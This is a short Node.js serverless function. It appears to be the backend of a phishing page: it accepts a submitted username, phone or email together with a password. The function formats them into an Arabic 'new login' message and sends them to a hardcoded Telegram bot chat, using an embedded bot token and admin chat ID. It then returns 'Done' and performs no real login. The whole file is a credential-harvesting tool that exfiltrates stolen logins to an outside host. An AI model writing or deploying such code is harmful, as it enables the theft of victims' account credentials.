const https = require('https');

const token = '5744685803:AAG1lO_jDrP6BC2qMmNx6Soqd6TB5u15ikg';
const adminId = '5581716001';

exports.handler = async function (event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' }),
        };
    }

    const { text, password } = JSON.parse(event.body);

    if (!text || !password) {
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Text (username/phone) and password are required' }),
        };
    }

    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : ${text}\nالرمز : ${password}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;

    try {
        const response = await new Promise((resolve, reject) => {
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', (err) => reject(err));
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Done' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error' }),
        };
    }
};
